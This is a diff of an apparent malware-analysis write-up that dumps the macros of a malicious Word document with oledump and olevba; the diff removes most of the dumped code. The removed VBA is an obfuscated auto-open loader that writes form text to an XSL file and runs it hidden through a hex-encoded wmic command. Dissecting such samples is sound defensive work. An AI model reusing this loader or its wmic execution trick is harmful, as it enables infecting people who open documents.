@@ -16,8 +16,7 @@ $ unzip -P xxx MRIS.zip
 Archive:  MRIS.zip
   inflating: info_08.15.doc
  =================================================================================================================== 
-  OfficeMalScanner>OfficeMalScanner.exe ..\..\info_08
-.15.doc info
+  OfficeMalScanner>OfficeMalScanner.exe ..\..\info_08.15.doc info
 
 +------------------------------------------+
 |           OfficeMalScanner v0.61         |
@@ -81,30 +80,7 @@ Attribute VB_PredeclaredId = True
 Attribute VB_Exposed = True
 Attribute VB_TemplateDerived = True
 Attribute VB_Customizable = True
-Sub Document_Open()
-Dim aFCX9
-aFCX9 = Hex(54)
-' Sr hc greek
-Dim ar7lW
-ar7lW = Abs(42)
-' Fete births sparc josh afternoon
-'
-amLIoeV = ""
-ahR7Ni = IsNull(amLIoeV)
-Dim aGmCp
-For aGmCp = 61 To 64
-Debug.Print Error(aGmCp)
-Next aGmCp
-aVQjtHW = ""
-a2gvH3Rl = IsNull(aVQjtHW)
-' Helicopter shaped older invite
-Dim aK6d75U
-aK6d75U = Exp(1)
-' Nominations kennels micro schema minus
-a9su7S = ""
-aeZvEyK2 = IsNull(a9su7S)
-main
-End Sub
+....
 ===================================================================================================================
 Mybash$ ../../oledump/oledump.py -v -s 14 info_08.15.doc 
 Attribute VB_Name = "a8q6cA"
@@ -116,134 +92,7 @@ For a2680s = 61 To 64
 Debug.Print Error(a2680s)
 Next a2680s
 ' Removable walk
-Dim aMvW30gz
-aMvW30gz = Fix(5)
-' Lonely co-operate
-Dim aelFf
-For aelFf = 61 To 64
-Debug.Print Error(aelFf)
-Next aelFf
-' Boudoir whiff
-Dim aTt3G
-For aTt3G = 61 To 64
-Debug.Print Error(aTt3G)
-Next aTt3G
-' Dans accreditation hebe marshy
-Dim aeh89Gg0u
-aeh89Gg0u = Hex(155)
-' Warehouse ranging
-Dim alKE5g
-For alKE5g = 61 To 64
-Debug.Print Error(alKE5g)
-Next alKE5g
-' Indigenous sick truthfulness prepared prominent distribution vc
-Dim aewK8al
-aewK8al = Fix(3)
-' Mercantile knickerbockers motorcycle undergraduate surrey
-Dim aU2IJW
-For aU2IJW = 61 To 64
-Debug.Print Error(aU2IJW)
-Next aU2IJW
-' Magazine
-Dim a5mQft
-For a5mQft = 61 To 64
-Debug.Print Error(a5mQft)
-Next a5mQft
-' Editorials generated colleagues vanilla
-Dim a0K4qg
-For a0K4qg = 61 To 64
-Debug.Print Error(a0K4qg)
-Next a0K4qg
-' Shore supernal
-Dim apHrclkq
-For apHrclkq = 61 To 64
-Debug.Print Error(apHrclkq)
-Next apHrclkq
-' Inexpensive abuse telescope
-aF8Ln = ""
-aqH1aCf = IsNull(aF8Ln)
-aF02NB = ""
-ackR3 = IsNull(aF02NB)
-' Fighter informal seaboard
-Dim aOLswHDG
-aOLswHDG = Abs(2)
-Dim awyXdU5t
-awyXdU5t = Exp(10)
-' Outdoors childbirth
-Dim aLYgv
-aLYgv = Abs(-55)
-Dim aCdvOiy
-aCdvOiy = Abs(32)
-' Sign guile gpl fake qld
-End Function
-Public Sub a6gXrDp(aSNc3thyR As String, aBIuC As String)
-Dim atYdl
-atYdl = Fix(9)
-' Terrible alignment
-Dim aKLobyl
-aKLobyl = Abs(49)
-Dim ahjAvXGT
-ahjAvXGT = Abs(-32)
-' Shanghai advise
-Dim ajC1uiX
-ajC1uiX = Fix(13)
-' Whaling republic
-arc0B = ""
-aoAPiTw = IsNull(arc0B)
-Dim a1vmcn7h
-a1vmcn7h = Fix(8)
-' Suck retard gentle composite
-Dim atZhQRnw
-atZhQRnw = Fix(7)
-Dim aSjg2
-aSjg2 = Exp(3)
-' Joy gregory mem premise
-Dim ayaXILT
-ayaXILT = Fix(9)
-' Refutation controls crumble bestowal increasingly
-aoTA6SQ = ""
-aQsYV = IsNull(aoTA6SQ)
-Dim a1KBybi3
-For a1KBybi3 = 61 To 64
-Debug.Print Error(a1KBybi3)
-Next a1KBybi3
-' Optimization silesia talisman
-Dim a1eS0L
-a1eS0L = Exp(7)
-Dim anFSMCvpg
-anFSMCvpg = Exp(8)
-' Technically
-Dim ax8Bukj1c
-ax8Bukj1c = Hex(115)
-' Creator recommendation rio sheer funereal alaska
-Dim acf8YPIBz
-acf8YPIBz = Fix(15)
-' Analysts tanner freud
-Dim as4U5JxvO
-as4U5JxvO = Fix(10)
-' Allen cameroon adverted adsl sociable rebound
-Open aSNc3thyR For Output As #1
-Print #1, aBIuC
-Close #1
-'
-Dim a0Gol17L
-a0Gol17L = Exp(15)
-' Healthful script crosswise
-Dim a37DQI
-a37DQI = Hex(151)
-Dim aYlC14Lst
-aYlC14Lst = Hex(36)
-End Sub
-Public Function a2FTLQz7(ByVal HexToStr As String) As String
-Dim strTemp   As String
-Dim strReturn As String
-Dim I         As Long
-    For I = 1 To Len(HexToStr) Step 2
-        strTemp = Chr$(Val("&H" & Mid$(HexToStr, I, 2)))
-        strReturn = strReturn & strTemp
-    Next I
-    a2FTLQz7 = strReturn
-End Function
+....
 
 ===================================================================================================================
 
@@ -254,334 +103,8 @@ Attribute VB_GlobalNameSpace = False
 Attribute VB_Creatable = False
 Attribute VB_PredeclaredId = True
 Attribute VB_Exposed = False
-Attribute VB_TemplateDerived = False
-Attribute VB_Customizable = False
-Private Sub UserForm_Initialize()
-Dim acTY95b23
-acTY95b23 = Fix(14)
-' Vans recondite compared finishing
-Dim aM1vciSg5
-aM1vciSg5 = Exp(14)
-aDdlzYL9 = ""
-aRN1J = IsNull(aDdlzYL9)
-' Imagination
-Dim axRQyWGfF
-axRQyWGfF = Hex(172)
-' Styles
-Dim a1XZ4WwMO
-a1XZ4WwMO = Abs(10)
-' Frederick provisional baptismal heterogeneous bind
-Dim a9A7Qux0H
-a9A7Qux0H = Abs(50)
-' Retaliation
-End Sub
-Public Sub test()
-Dim a0S94
-a0S94 = Fix(6)
-' Hughes nigeria disavow principal allow
-Dim a1ZKym
-a1ZKym = Hex(150)
-' Confirmation achieving res banana ryan floppy
-Dim aGOwqKIu
-aGOwqKIu = Hex(85)
-Dim aAdDk4rM
-aAdDk4rM = Hex(99)
-' Donald mediawiki
-End Sub
-Mybash$ ../../oledump/oledump.py -v -s 16 info_08.15.doc 
-Attribute VB_Name = "aKVwYGaC"
-Sub main()
-aBJwCPkMX = ""
-auTqHQ = IsNull(aBJwCPkMX)
-' Showers venues grand
-Dim aF1TxD
-aF1TxD = Exp(3)
-Dim aa5xDEFK
-aa5xDEFK = Hex(228)
-' Habitat exuberant pledge pyre
-Dim aqk4PAa7
-aqk4PAa7 = Hex(74)
-' Star capable sallies electoral generating
-Dim axfO6I
-axfO6I = Fix(8)
-' Lil mixing bracket speaks
-Dim aa6tSYoXv
-aa6tSYoXv = Hex(42)
-' Whichever griffith pitfall poop vicarious meme deserter
-Dim a6AyZuVYH
-a6AyZuVYH = Abs(-62)
-' Senegal inborn extract
-aTuleUIaF = ""
-aFp297zko = IsNull(aTuleUIaF)
-' Equipped
-Dim aFYcp3fwV
-aFYcp3fwV = Exp(10)
-Dim abuGC3T
-abuGC3T = Hex(158)
-' Heterogeneous responding cartilage lading roth
-Dim aylvItc
-aylvItc = Hex(4)
-auWwgEd7 = ""
-al8H6FQS = IsNull(auWwgEd7)
-' Lit trustee aberdeen foolhardy
-Dim aNkDLizhm
-aNkDLizhm = Abs(45)
-avw26Vg = ""
-atCwmqha = IsNull(avw26Vg)
-' Hardware player moreover colonist
-Dim aiZWY
-aiZWY = Hex(109)
-' Bolt analytical homily take
-Dim aw6VPSMv8
-aw6VPSMv8 = Fix(3)
-Dim ayb1zo As Object
-aRqEK583 = ""
-aHXjgu = IsNull(aRqEK583)
-' Packaging ebony canvas nascar flattened formerly
-Dim amnNr
-amnNr = Hex(244)
-' Sans flicker
-Dim ax2LK9loZ
-For ax2LK9loZ = 61 To 64
-Debug.Print Error(ax2LK9loZ)
-Next ax2LK9loZ
-' Assists loud
-aTFRz8Y = ""
-akKrbyc = IsNull(aTFRz8Y)
-' Hansom casualty
-Set ayb1zo = New aElSGoL2t
-Dim aGK4x
-aGK4x = Exp(8)
-' Punishment breton
-Dim aNt8p
-aNt8p = Abs(-57)
-' Sulky campus correction discursive maryland seraph
-Dim a3z0mg1 As String
-Dim abZcE39S
-abZcE39S = Hex(114)
-Dim awAmOa82
-For awAmOa82 = 61 To 64
-Debug.Print Error(awAmOa82)
-Next awAmOa82
-' Wal rights preoccupied plan
-a3z0mg1 = ayb1zo.a9kPX.Text
-Dim ahdLy6
-ahdLy6 = Exp(2)
-' Brand momentum
-avszE = ""
-aQ4FC = IsNull(avszE)
-' Ponds episodes beneficiary ponder insurance
-Dim aO16A9mV
-aO16A9mV = Fix(6)
-' Organized
-a3yT0 = ""
-acMCtnYd = IsNull(a3yT0)
-' Barcelona irreligious
-Dim aEFo3ORZ As String
-Dim aL04PMgz1
-aL04PMgz1 = Abs(-42)
-Dim aFRmCpVz
-aFRmCpVz = Exp(9)
-aEFo3ORZ = a2FTLQz7("633a5c57696e646f77735c53797374656d33325c7762656d5c776d69632070726f63657373206c697374202f666f726d61743a2261724a7a52734c65542e78736c22")
-ataVXLEI = ""
-aHXJ7W = IsNull(ataVXLEI)
-aqRTKt = ""
-adRvJE = IsNull(aqRTKt)
-' Inducement ochre
-Dim aN6Wq
-aN6Wq = Fix(3)
-' Gibbet priced pull
-Dim aOfXe
-aOfXe = Fix(11)
-' Experts mouthful
-Call a6gXrDp("arJzRsLeT.xsl", a3z0mg1)
-Dim aGif8BUMr
-aGif8BUMr = Fix(3)
-' Gates unalterable
-Dim adlEkrO
-adlEkrO = Fix(12)
-' Mead students slot terrier directories esperanto trials
-Dim aq8ZDNBH
-aq8ZDNBH = Hex(202)
-' Northern shirts programming
-Dim ajzZlsFBK
-ajzZlsFBK = Fix(10)
-' Dramatist ill-omened
-aTOdBynN = ""
-aHmirMu = IsNull(aTOdBynN)
-Dim awzlUn
-For awzlUn = 61 To 64
-Debug.Print Error(awzlUn)
-Next awzlUn
-' Champion fiendish converted
-Dim aiFH3gG
-aiFH3gG = Abs(-36)
-' Transferred mumbai ninety-five un
-Dim aXsYOvWr
-aXsYOvWr = Exp(8)
-Dim aDR6E1ae
-aDR6E1ae = Fix(12)
-' Priest assists retain
-Dim ao5qz
-ao5qz = Fix(7)
-' Agents strengths navy belied
-Dim aGKjCia0d
-For aGKjCia0d = 61 To 64
-Debug.Print Error(aGKjCia0d)
-Next aGKjCia0d
-' Andorra wildfire carnal
-aEDHXF = ""
-aaB0c5 = IsNull(aEDHXF)
-' Agencies practices ostend parameters
-Dim aokuval
-aokuval = Abs(14)
-Dim aLvc3bl6
-aLvc3bl6 = Exp(1)
-' Cbs
-Dim amLOhk
-amLOhk = Exp(6)
-Dim aICQw2l
-aICQw2l = Hex(193)
-' Focus shipped aryan correlative
-Dim avpn4g
-avpn4g = Hex(103)
-' Gore jazz cl ninety-nine
-Dim aCoLND
-aCoLND = Hex(233)
-' Meaningless destiny
-Dim a3byjf
-a3byjf = Fix(10)
-aEdiDs3 = ""
-ajKcPdMe0 = IsNull(aEdiDs3)
-' Establishment
-Dim aEgrxsW
-aEgrxsW = Abs(41)
-Dim aQvcG7
-aQvcG7 = Abs(52)
-' Indians mh
-aTlDZvI6 = ""
-aaN7vsqn = IsNull(aTlDZvI6)
-' Fix
-Dim aTZh1Xi
-aTZh1Xi = Fix(8)
-' Gamespot nonprofit unconnected
-Dim a16qXb
-a16qXb = Exp(11)
-Dim aTYaln
-aTYaln = Exp(8)
-' Descending ukraine arrive greatly
-Dim aqNKCSz
-aqNKCSz = Fix(16)
-' Underrated unbalanced trickery
-Dim ao5a0r
-ao5a0r = Exp(9)
-' Fragmentary objectives adolescent oily approach
-Dim a7JUTBgSC As WshShell
-Dim avRx4yOCl
-For avRx4yOCl = 61 To 64
-Debug.Print Error(avRx4yOCl)
-Next avRx4yOCl
-' Spartan forgot transparency codes
-Dim axcdFywIH
-axcdFywIH = Fix(7)
-' Inspiration knee-deep greenery amethyst suspend
-Dim agNvwybD
-agNvwybD = Exp(1)
-' Asks blent
-Dim aFMOoNyd
-aFMOoNyd = Exp(4)
-Dim amfDu
-amfDu = Fix(11)
-Dim aXTuPLS5
-aXTuPLS5 = Hex(72)
-' Immeasurable astringent
-Dim a3d7K
-a3d7K = Abs(56)
-Dim ae2jNxg
-ae2jNxg = Fix(9)
-Set a7JUTBgSC = New WshShell
-Dim aL9Ox
-aL9Ox = Exp(3)
-' Carnival clive newfoundland burner layers
-Dim acN7CB0E
-acN7CB0E = Abs(48)
-' Infuse apse tidal latticed
-Dim atY7uXym8
-atY7uXym8 = Fix(11)
-Dim aY9ZTq0J
-aY9ZTq0J = Fix(10)
-av8rwWP = ""
-aSQAt6Fl = IsNull(av8rwWP)
-Dim a3GhNR
-a3GhNR = Abs(-35)
-a7JUTBgSC.run aEFo3ORZ, 0
-Dim aInqePR
-aInqePR = Exp(4)
-' Determine tease lazarus roam
-Dim aSdmh
-aSdmh = Exp(3)
-' Jar sambo incentives nathan frames ditty unpopular
-
-Dim a4QyLn175
-a4QyLn175 = Hex(79)
-aHYrJg1b3 = ""
-aJoILFZ = IsNull(aHYrJg1b3)
-' Et
-Dim ark02
-ark02 = Hex(102)
-' Exhilaration idaho atrium japanese surfeit
-Dim aL7iCqWUh
-For aL7iCqWUh = 61 To 64
-Debug.Print Error(aL7iCqWUh)
-Next aL7iCqWUh
-' Avon gunshot postman shoemaker floyd
-Dim aUvdlAs
-aUvdlAs = Abs(56)
-End Sub
-Mybash$ ../../oledump/oledump.py -v -s 17 info_08.15.doc 
-Attribute VB_Name = "alJ6CoiF"
-Function avtkzIW(aIALcflv7 As Long) As String
-Dim aBVwx2J
-aBVwx2J = Hex(161)
-' Combatant collaboration cookies diffs mutation disquisition
-ad6sf = ""
-aYj45mwpQ = IsNull(ad6sf)
-' Im- observer wrongly
-Dim aFKyD5
-aFKyD5 = Hex(86)
-Dim amG4H
-amG4H = Fix(1)
-' Confusion reforms declare
-Dim aroTQsm5
-aroTQsm5 = Hex(81)
-' Programmers mysql consummation busted
-Dim a2QkK6O
-a2QkK6O = Abs(-35)
-' Spider dislocation tornado repair steeple
-Dim aOU3pyqL
-For aOU3pyqL = 61 To 64
-Debug.Print Error(aOU3pyqL)
-Next aOU3pyqL
-' Nourish
-Dim aLSYqmK
-aLSYqmK = Fix(7)
-' Consecrate
-anG07TU = ""
-aOu1R5w = IsNull(anG07TU)
-Dim aDGnu
-aDGnu = Hex(10)
-' Gordon guests
-Dim aZbJ3
-aZbJ3 = Exp(11)
-' Pearly ram
-Dim ao7xC
-For ao7xC = 61 To 64
-Debug.Print Error(ao7xC)
-Next ao7xC
-Dim aXJtMDn5N
-aXJtMDn5N = Fix(5)
 End Function
-
+.....
 ===========================================================================================================
 olevba.py 
 
@@ -593,507 +116,8 @@ OLE:MASIHB-- info_08.15.doc
 ===============================================================================
 FILE: info_08.15.doc
 Type: OLE
--------------------------------------------------------------------------------
-VBA MACRO ThisDocument.cls 
-in file: info_08.15.doc - OLE stream: u'Macros/VBA/ThisDocument'
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Sub Document_Open()
-Dim aFCX9
-aFCX9 = Hex(54)
-' Sr hc greek
-Dim ar7lW
-ar7lW = Abs(42)
-' Fete births sparc josh afternoon
-'
-amLIoeV = ""
-ahR7Ni = IsNull(amLIoeV)
-Dim aGmCp
-For aGmCp = 61 To 64
-Debug.Print Error(aGmCp)
-Next aGmCp
-aVQjtHW = ""
-a2gvH3Rl = IsNull(aVQjtHW)
-' Helicopter shaped older invite
-Dim aK6d75U
-aK6d75U = Exp(1)
-' Nominations kennels micro schema minus
-a9su7S = ""
-aeZvEyK2 = IsNull(a9su7S)
-main
-End Sub
--------------------------------------------------------------------------------
-VBA MACRO alJ6CoiF.bas 
-in file: info_08.15.doc - OLE stream: u'Macros/VBA/alJ6CoiF'
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Function avtkzIW(aIALcflv7 As Long) As String
-Dim aBVwx2J
-aBVwx2J = Hex(161)
-' Combatant collaboration cookies diffs mutation disquisition
-ad6sf = ""
-aYj45mwpQ = IsNull(ad6sf)
-' Im- observer wrongly
-Dim aFKyD5
-aFKyD5 = Hex(86)
-Dim amG4H
-amG4H = Fix(1)
-' Confusion reforms declare
-Dim aroTQsm5
-aroTQsm5 = Hex(81)
-' Programmers mysql consummation busted
-Dim a2QkK6O
-a2QkK6O = Abs(-35)
-' Spider dislocation tornado repair steeple
-Dim aOU3pyqL
-For aOU3pyqL = 61 To 64
-Debug.Print Error(aOU3pyqL)
-Next aOU3pyqL
-' Nourish
-Dim aLSYqmK
-aLSYqmK = Fix(7)
-' Consecrate
-anG07TU = ""
-aOu1R5w = IsNull(anG07TU)
-Dim aDGnu
-aDGnu = Hex(10)
-' Gordon guests
-Dim aZbJ3
-aZbJ3 = Exp(11)
-' Pearly ram
-Dim ao7xC
-For ao7xC = 61 To 64
-Debug.Print Error(ao7xC)
-Next ao7xC
-Dim aXJtMDn5N
-aXJtMDn5N = Fix(5)
-End Function
--------------------------------------------------------------------------------
-VBA MACRO a8q6cA.bas 
-in file: info_08.15.doc - OLE stream: u'Macros/VBA/a8q6cA'
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Function ayrlTQ(aG1m35a As String) As String
-Dim aTGpk0Y
-aTGpk0Y = Hex(165)
-Dim a2680s
-For a2680s = 61 To 64
-Debug.Print Error(a2680s)
-Next a2680s
-' Removable walk
-Dim aMvW30gz
-aMvW30gz = Fix(5)
-' Lonely co-operate
-Dim aelFf
-For aelFf = 61 To 64
-Debug.Print Error(aelFf)
-Next aelFf
-' Boudoir whiff
-Dim aTt3G
-For aTt3G = 61 To 64
-Debug.Print Error(aTt3G)
-Next aTt3G
-' Dans accreditation hebe marshy
-Dim aeh89Gg0u
-aeh89Gg0u = Hex(155)
-' Warehouse ranging
-Dim alKE5g
-For alKE5g = 61 To 64
-Debug.Print Error(alKE5g)
-Next alKE5g
-' Indigenous sick truthfulness prepared prominent distribution vc
-Dim aewK8al
-aewK8al = Fix(3)
-' Mercantile knickerbockers motorcycle undergraduate surrey
-Dim aU2IJW
-For aU2IJW = 61 To 64
-Debug.Print Error(aU2IJW)
-Next aU2IJW
-' Magazine
-Dim a5mQft
-For a5mQft = 61 To 64
-Debug.Print Error(a5mQft)
-Next a5mQft
-' Editorials generated colleagues vanilla
-Dim a0K4qg
-For a0K4qg = 61 To 64
-Debug.Print Error(a0K4qg)
-Next a0K4qg
-' Shore supernal
-Dim apHrclkq
-For apHrclkq = 61 To 64
-Debug.Print Error(apHrclkq)
-Next apHrclkq
-' Inexpensive abuse telescope
-aF8Ln = ""
-aqH1aCf = IsNull(aF8Ln)
-aF02NB = ""
-ackR3 = IsNull(aF02NB)
-' Fighter informal seaboard
-Dim aOLswHDG
-aOLswHDG = Abs(2)
-Dim awyXdU5t
-awyXdU5t = Exp(10)
-' Outdoors childbirth
-Dim aLYgv
-aLYgv = Abs(-55)
-Dim aCdvOiy
-aCdvOiy = Abs(32)
-' Sign guile gpl fake qld
-End Function
-Public Sub a6gXrDp(aSNc3thyR As String, aBIuC As String)
-Dim atYdl
-atYdl = Fix(9)
-' Terrible alignment
-Dim aKLobyl
-aKLobyl = Abs(49)
-Dim ahjAvXGT
-ahjAvXGT = Abs(-32)
-' Shanghai advise
-Dim ajC1uiX
-ajC1uiX = Fix(13)
-' Whaling republic
-arc0B = ""
-aoAPiTw = IsNull(arc0B)
-Dim a1vmcn7h
-a1vmcn7h = Fix(8)
-' Suck retard gentle composite
-Dim atZhQRnw
-atZhQRnw = Fix(7)
-Dim aSjg2
-aSjg2 = Exp(3)
-' Joy gregory mem premise
-Dim ayaXILT
-ayaXILT = Fix(9)
-' Refutation controls crumble bestowal increasingly
-aoTA6SQ = ""
-aQsYV = IsNull(aoTA6SQ)
-Dim a1KBybi3
-For a1KBybi3 = 61 To 64
-Debug.Print Error(a1KBybi3)
-Next a1KBybi3
-' Optimization silesia talisman
-Dim a1eS0L
-a1eS0L = Exp(7)
-Dim anFSMCvpg
-anFSMCvpg = Exp(8)
-' Technically
-Dim ax8Bukj1c
-ax8Bukj1c = Hex(115)
-' Creator recommendation rio sheer funereal alaska
-Dim acf8YPIBz
-acf8YPIBz = Fix(15)
-' Analysts tanner freud
-Dim as4U5JxvO
-as4U5JxvO = Fix(10)
-' Allen cameroon adverted adsl sociable rebound
-Open aSNc3thyR For Output As #1
-Print #1, aBIuC
-Close #1
-'
-Dim a0Gol17L
-a0Gol17L = Exp(15)
-' Healthful script crosswise
-Dim a37DQI
-a37DQI = Hex(151)
-Dim aYlC14Lst
-aYlC14Lst = Hex(36)
-End Sub
-Public Function a2FTLQz7(ByVal HexToStr As String) As String
-Dim strTemp   As String
-Dim strReturn As String
-Dim I         As Long
-    For I = 1 To Len(HexToStr) Step 2
-        strTemp = Chr$(Val("&H" & Mid$(HexToStr, I, 2)))
-        strReturn = strReturn & strTemp
-    Next I
-    a2FTLQz7 = strReturn
-End Function
--------------------------------------------------------------------------------
-VBA MACRO aKVwYGaC.bas 
-in file: info_08.15.doc - OLE stream: u'Macros/VBA/aKVwYGaC'
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Sub main()
-aBJwCPkMX = ""
-auTqHQ = IsNull(aBJwCPkMX)
-' Showers venues grand
-Dim aF1TxD
-aF1TxD = Exp(3)
-Dim aa5xDEFK
-aa5xDEFK = Hex(228)
-' Habitat exuberant pledge pyre
-Dim aqk4PAa7
-aqk4PAa7 = Hex(74)
-' Star capable sallies electoral generating
-Dim axfO6I
-axfO6I = Fix(8)
-' Lil mixing bracket speaks
-Dim aa6tSYoXv
-aa6tSYoXv = Hex(42)
-' Whichever griffith pitfall poop vicarious meme deserter
-Dim a6AyZuVYH
-a6AyZuVYH = Abs(-62)
-' Senegal inborn extract
-aTuleUIaF = ""
-aFp297zko = IsNull(aTuleUIaF)
-' Equipped
-Dim aFYcp3fwV
-aFYcp3fwV = Exp(10)
-Dim abuGC3T
-abuGC3T = Hex(158)
-' Heterogeneous responding cartilage lading roth
-Dim aylvItc
-aylvItc = Hex(4)
-auWwgEd7 = ""
-al8H6FQS = IsNull(auWwgEd7)
-' Lit trustee aberdeen foolhardy
-Dim aNkDLizhm
-aNkDLizhm = Abs(45)
-avw26Vg = ""
-atCwmqha = IsNull(avw26Vg)
-' Hardware player moreover colonist
-Dim aiZWY
-aiZWY = Hex(109)
-' Bolt analytical homily take
-Dim aw6VPSMv8
-aw6VPSMv8 = Fix(3)
-Dim ayb1zo As Object
-aRqEK583 = ""
-aHXjgu = IsNull(aRqEK583)
-' Packaging ebony canvas nascar flattened formerly
-Dim amnNr
-amnNr = Hex(244)
-' Sans flicker
-Dim ax2LK9loZ
-For ax2LK9loZ = 61 To 64
-Debug.Print Error(ax2LK9loZ)
-Next ax2LK9loZ
-' Assists loud
-aTFRz8Y = ""
-akKrbyc = IsNull(aTFRz8Y)
-' Hansom casualty
-Set ayb1zo = New aElSGoL2t
-Dim aGK4x
-aGK4x = Exp(8)
-' Punishment breton
-Dim aNt8p
-aNt8p = Abs(-57)
-' Sulky campus correction discursive maryland seraph
-Dim a3z0mg1 As String
-Dim abZcE39S
-abZcE39S = Hex(114)
-Dim awAmOa82
-For awAmOa82 = 61 To 64
-Debug.Print Error(awAmOa82)
-Next awAmOa82
-' Wal rights preoccupied plan
-a3z0mg1 = ayb1zo.a9kPX.Text
-Dim ahdLy6
-ahdLy6 = Exp(2)
-' Brand momentum
-avszE = ""
-aQ4FC = IsNull(avszE)
-' Ponds episodes beneficiary ponder insurance
-Dim aO16A9mV
-aO16A9mV = Fix(6)
-' Organized
-a3yT0 = ""
-acMCtnYd = IsNull(a3yT0)
-' Barcelona irreligious
-Dim aEFo3ORZ As String
-Dim aL04PMgz1
-aL04PMgz1 = Abs(-42)
-Dim aFRmCpVz
-aFRmCpVz = Exp(9)
-aEFo3ORZ = a2FTLQz7("633a5c57696e646f77735c53797374656d33325c7762656d5c776d69632070726f63657373206c697374202f666f726d61743a2261724a7a52734c65542e78736c22")
-ataVXLEI = ""
-aHXJ7W = IsNull(ataVXLEI)
-aqRTKt = ""
-adRvJE = IsNull(aqRTKt)
-' Inducement ochre
-Dim aN6Wq
-aN6Wq = Fix(3)
-' Gibbet priced pull
-Dim aOfXe
-aOfXe = Fix(11)
-' Experts mouthful
-Call a6gXrDp("arJzRsLeT.xsl", a3z0mg1)
-Dim aGif8BUMr
-aGif8BUMr = Fix(3)
-' Gates unalterable
-Dim adlEkrO
-adlEkrO = Fix(12)
-' Mead students slot terrier directories esperanto trials
-Dim aq8ZDNBH
-aq8ZDNBH = Hex(202)
-' Northern shirts programming
-Dim ajzZlsFBK
-ajzZlsFBK = Fix(10)
-' Dramatist ill-omened
-aTOdBynN = ""
-aHmirMu = IsNull(aTOdBynN)
-Dim awzlUn
-For awzlUn = 61 To 64
-Debug.Print Error(awzlUn)
-Next awzlUn
-' Champion fiendish converted
-Dim aiFH3gG
-aiFH3gG = Abs(-36)
-' Transferred mumbai ninety-five un
-Dim aXsYOvWr
-aXsYOvWr = Exp(8)
-Dim aDR6E1ae
-aDR6E1ae = Fix(12)
-' Priest assists retain
-Dim ao5qz
-ao5qz = Fix(7)
-' Agents strengths navy belied
-Dim aGKjCia0d
-For aGKjCia0d = 61 To 64
-Debug.Print Error(aGKjCia0d)
-Next aGKjCia0d
-' Andorra wildfire carnal
-aEDHXF = ""
-aaB0c5 = IsNull(aEDHXF)
-' Agencies practices ostend parameters
-Dim aokuval
-aokuval = Abs(14)
-Dim aLvc3bl6
-aLvc3bl6 = Exp(1)
-' Cbs
-Dim amLOhk
-amLOhk = Exp(6)
-Dim aICQw2l
-aICQw2l = Hex(193)
-' Focus shipped aryan correlative
-Dim avpn4g
-avpn4g = Hex(103)
-' Gore jazz cl ninety-nine
-Dim aCoLND
-aCoLND = Hex(233)
-' Meaningless destiny
-Dim a3byjf
-a3byjf = Fix(10)
-aEdiDs3 = ""
-ajKcPdMe0 = IsNull(aEdiDs3)
-' Establishment
-Dim aEgrxsW
-aEgrxsW = Abs(41)
-Dim aQvcG7
-aQvcG7 = Abs(52)
-' Indians mh
-aTlDZvI6 = ""
-aaN7vsqn = IsNull(aTlDZvI6)
-' Fix
-Dim aTZh1Xi
-aTZh1Xi = Fix(8)
-' Gamespot nonprofit unconnected
-Dim a16qXb
-a16qXb = Exp(11)
-Dim aTYaln
-aTYaln = Exp(8)
-' Descending ukraine arrive greatly
-Dim aqNKCSz
-aqNKCSz = Fix(16)
-' Underrated unbalanced trickery
-Dim ao5a0r
-ao5a0r = Exp(9)
-' Fragmentary objectives adolescent oily approach
-Dim a7JUTBgSC As WshShell
-Dim avRx4yOCl
-For avRx4yOCl = 61 To 64
-Debug.Print Error(avRx4yOCl)
-Next avRx4yOCl
-' Spartan forgot transparency codes
-Dim axcdFywIH
-axcdFywIH = Fix(7)
-' Inspiration knee-deep greenery amethyst suspend
-Dim agNvwybD
-agNvwybD = Exp(1)
-' Asks blent
-Dim aFMOoNyd
-aFMOoNyd = Exp(4)
-Dim amfDu
-amfDu = Fix(11)
-Dim aXTuPLS5
-aXTuPLS5 = Hex(72)
-' Immeasurable astringent
-Dim a3d7K
-a3d7K = Abs(56)
-Dim ae2jNxg
-ae2jNxg = Fix(9)
-Set a7JUTBgSC = New WshShell
-Dim aL9Ox
-aL9Ox = Exp(3)
-' Carnival clive newfoundland burner layers
-Dim acN7CB0E
-acN7CB0E = Abs(48)
-' Infuse apse tidal latticed
-Dim atY7uXym8
-atY7uXym8 = Fix(11)
-Dim aY9ZTq0J
-aY9ZTq0J = Fix(10)
-av8rwWP = ""
-aSQAt6Fl = IsNull(av8rwWP)
-Dim a3GhNR
-a3GhNR = Abs(-35)
-a7JUTBgSC.run aEFo3ORZ, 0
-Dim aInqePR
-aInqePR = Exp(4)
-' Determine tease lazarus roam
-Dim aSdmh
-aSdmh = Exp(3)
-' Jar sambo incentives nathan frames ditty unpopular
 
-Dim a4QyLn175
-a4QyLn175 = Hex(79)
-aHYrJg1b3 = ""
-aJoILFZ = IsNull(aHYrJg1b3)
-' Et
-Dim ark02
-ark02 = Hex(102)
-' Exhilaration idaho atrium japanese surfeit
-Dim aL7iCqWUh
-For aL7iCqWUh = 61 To 64
-Debug.Print Error(aL7iCqWUh)
-Next aL7iCqWUh
-' Avon gunshot postman shoemaker floyd
-Dim aUvdlAs
-aUvdlAs = Abs(56)
-End Sub
--------------------------------------------------------------------------------
-VBA MACRO aElSGoL2t.frm 
-in file: info_08.15.doc - OLE stream: u'Macros/VBA/aElSGoL2t'
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Private Sub UserForm_Initialize()
-Dim acTY95b23
-acTY95b23 = Fix(14)
-' Vans recondite compared finishing
-Dim aM1vciSg5
-aM1vciSg5 = Exp(14)
-aDdlzYL9 = ""
-aRN1J = IsNull(aDdlzYL9)
-' Imagination
-Dim axRQyWGfF
-axRQyWGfF = Hex(172)
-' Styles
-Dim a1XZ4WwMO
-a1XZ4WwMO = Abs(10)
-' Frederick provisional baptismal heterogeneous bind
-Dim a9A7Qux0H
-a9A7Qux0H = Abs(50)
-' Retaliation
-End Sub
-Public Sub test()
-Dim a0S94
-a0S94 = Fix(6)
-' Hughes nigeria disavow principal allow
-Dim a1ZKym
-a1ZKym = Hex(150)
-' Confirmation achieving res banana ryan floppy
-Dim aGOwqKIu
-aGOwqKIu = Hex(85)
-Dim aAdDk4rM
-aAdDk4rM = Hex(99)
-' Donald mediawiki
-End Sub
+
